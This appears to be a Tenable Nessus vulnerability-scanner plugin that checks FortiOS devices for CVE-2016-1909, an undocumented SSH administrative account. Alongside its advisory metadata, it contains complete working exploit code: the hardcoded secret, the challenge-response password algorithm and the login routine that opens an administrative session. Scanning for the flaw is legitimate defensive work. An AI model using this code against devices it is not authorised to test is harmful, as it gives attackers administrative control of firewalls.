#TRUSTED 9e2ae0c4d3e15e3a7561a1ac315684017f0db8e22df3e7bdf3cb92880f8c374430eed5989f65f67cc7d1e2e86c762c0fa0d76618d889a93244dda41a53c9b19497823bf0ca004146f8122a0c44e288ce26a0a45004df21279cce06794c90be095eee29638a8eba402cd72ff2271af62948b4af5be0e3c8d846ff6767e04f40ce25a6b5092088d4b19e7fac51b1ba4c2815e6730c6e958792c70dca5647bf8f4e6e23ef0357bc508304e15ca86e85cf137378fdeabd85a5a1e4dc42bb597d3db7391c2b17f312cb135fd4da458e7d7b60d742c1d97a4765ac082f2fa79039bf5474200f36b48d7f184a5bc31e4187d5ad09c91cf5e05fc456109769bd262c92df860270355e5dd88d976e48204dfb9b769f6ab4d34bddd9372fbed988383eaa3dccd825737b32518345f7ccf5147226d7cb9b81abaa48100d1de7b4d40fc89f742fed50a515a55488a49d547244c13e5532bda34162f6b2c28751204acc55d0ec40eecf805ee920216a7ea6b9e88c962c6f12a407e5d25f891a0aaeb6355af35ae00d6c7796d7bd9d98d16b3b5e393e62b176d09f4893bbae43130eceb1e9ede45251f167706c78328885987744efc01fc741d2d0c025a2cf26ebf669f73253a089a98e0a847c95f4629eb5d524fe8b81410fa0f62f4f4afe743b8a3067ff15c0cb7aef2384c405470c973963f140c99b1cfa49e125d1733b90789b3f9d174230
#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(87896);
  script_version("1.3");
  script_set_attribute(attribute:"plugin_modification_date", value:"2016/04/01");

  script_cve_id("CVE-2016-1909");
  script_bugtraq_id(80581);
  script_osvdb_id(132760);

  script_name(english:"Fortinet FortiOS SSH Undocumented Interactive Login Vulnerability");
  script_summary(english:"Attempts to login to SSH as the user 'Fortimanager_Access'.");

  script_set_attribute(attribute:"synopsis", value:
"The SSH server running on the remote host can be logged into using
default SSH credentials.");
  script_set_attribute(attribute:"description", value:
"The SSH server running on the remote host can be logged into using
default SSH credentials. The 'Fortimanager_Access' account has a
password based on the string 'FGTAbc11*xy+Qqz27' and a calculated hash
that is publicly known. A remote attacker can exploit this to gain
administrative access to the remote host.");
  # https://blog.fortinet.com/post/brief-statement-regarding-issues-found-with-fortios
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0c2dcc56");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2016/Jan/26");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Fortinet FortiOS 4.3.17 / 5.0.8 / 5.2.x / 5.4.x or later.
Alternatively, as a workaround, disable administrative access via SSH
on all interfaces.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/01/12");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/07/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/01/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:fortinet:fortios");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_set_attribute(attribute:"default_account", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("ssh_detect.nasl");
  script_require_ports("Services/ssh");

  script_exclude_keys("global_settings/supplied_logins_only");

  exit(0);
}

include("audit.inc");
include("byte_func.inc");
include("global_settings.inc");
include("misc_func.inc");
include("ssh_func.inc");

# This script duplicates a handful of code in ssh_func.inc. The reason for
# this is that this exploit requires special logic at the interactive password
# prompt. Instead of having a normal prompt like "Password:", affected versions
# will prompt with a string of digits. These digits are rolled into a
# custom "hashing" algorithm in order to generate a semi-random password.

function ssh_custom_interactive_auth(user, port)
{
  local_var code, crap, next, payload, prompt, prompts, res, inst, i, password;

  # Request keyboard-interactive authentication from the server.
  payload =
    putstring(buffer:user) +
    putstring(buffer:"ssh-connection") +
    putstring(buffer:"keyboard-interactive") +
    putstring(buffer:"en-US") +
    putstring(buffer:"");

  send_ssh_packet(code:SSH_MSG_USERAUTH_REQUEST, payload:payload);

  # Read the server's response.
  res = recv_ssh_packet();
  code = ord(res[0]);
  next = 1;

  if (code == SSH_MSG_USERAUTH_FAILURE) return FALSE;
  if (code == SSH_MSG_UNIMPLEMENTED) return FALSE;
  if (code != SSH_MSG_USERAUTH_INFO_REQUEST) return FALSE;

  # Skip over name.
  crap = getstring(buffer:res, pos:next);
  next += 4 + strlen(crap);

  # Skip over instruction.
  inst = getstring(buffer:res, pos:next);
  next += 4 + strlen(inst);

  # Skip over language.
  crap = getstring(buffer:res, pos:next);
  next += 4 + strlen(crap);

  # Parse number of prompts.
  prompts = ntol(buffer:res, begin:next);
  next += 4;

  if (prompts <= 0) return FALSE;

  # the prompt is the challenge code
  prompt = getstring(buffer:res, pos:next);

  # verify the "prompt" is all numerals
  for (i = 0; i < strlen(prompt); i++) {
    if (prompt[i] < '0' || prompt[i] >'9') {
      if (i != 0) return FALSE;
      else if (prompt[i] != '-') return FALSE;
    }
  }

  # generate the SHA1 encoded portion
  local_var sha1_password = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00';
  sha1_password += prompt;
  sha1_password += 'FGTAbc11*xy+Qqz27';
  sha1_password += '\xA3\x88\xBA\x2E\x42\x4C\xB0\x4A\x53\x79\x30\xC1\x31\x07\xCC\x3F\xA1\x32\x90\x29\xA9\x81\x5B\x70';
  sha1_password = SHA1(sha1_password);

  # generate the base64 encoded version
  local_var base64_password = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00';
  base64_password += sha1_password;
  base64_password = base64(str:base64_password);

  # the final form of the password
  password = 'AK1' + base64_password;

  # Send a single response, containing the password, to server.
  SSH_PACKET_LOG_SCRUB_STRING = password;
  payload = raw_int32(i:1) + putstring(buffer:password);
  send_ssh_packet(code:SSH_MSG_USERAUTH_INFO_RESPONSE, payload:payload);
  SSH_PACKET_LOG_SCRUB_STRING = FALSE;

  # Read response from server.
  res = recv_ssh_packet();
  code = ord(res[0]);
  return code == SSH_MSG_USERAUTH_SUCCESS;
}

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

# Hard coded username enabled keyboard-interactive
user = 'Fortimanager_Access';
password = '';
port = get_service(svc:"ssh", exit_on_fail:TRUE);

_ssh_socket = open_sock_tcp(port);
if (!_ssh_socket) audit(AUDIT_SOCK_FAIL, port);

# initialization
init();
server_version = ssh_exchange_identification();
if (!server_version)
{
  ssh_close_connection();
  audit(AUDIT_RESP_BAD, port, "SSH ID exchange.");
}

_ssh_server_version = server_version;

# key exchange
ret = ssh_kex2(server_version:server_version, nofingerprint:TRUE);
if (ret != 0)
{
  ssh_close_connection();
  audit(AUDIT_LISTEN_NOT_VULN, "SSH", port);
}

if (!ssh_req_svc("ssh-userauth"))
{
  ssh_close_connection();
  audit(AUDIT_LISTEN_NOT_VULN, "SSH", port);
}

if (!ssh_auth_supported(method:"keyboard-interactive", user:user))
{
  ssh_close_connection();
  audit(AUDIT_LISTEN_NOT_VULN, "SSH", port);
}

system_status = '';
if (ssh_custom_interactive_auth(user:user, port:port)) {
  resp = ssh_cmd(cmd:"get system status", nosh:TRUE, nosudo:TRUE);
  if (resp && "Version:" >< resp) {
    system_status = resp;
  }
}

ssh_close_connection();

if (system_status != '')
{
  if (report_verbosity > 0)
  {
     report =
       '\n' + 'It was possible to SSH into the remote FortiOS device using the' +
       '\n' + 'following username :' +
       '\n' +
       '\n' + '  User     : ' + user +
       '\n' +
       '\n' + 'and to run the \'get system status\' command, which returned :'+
       '\n' +
       '\n' + system_status + '\n';
    security_hole(port:port, extra:report);
  } else security_hole(port:port);
}
else
{
  audit(AUDIT_LISTEN_NOT_VULN, "SSH", port);
}
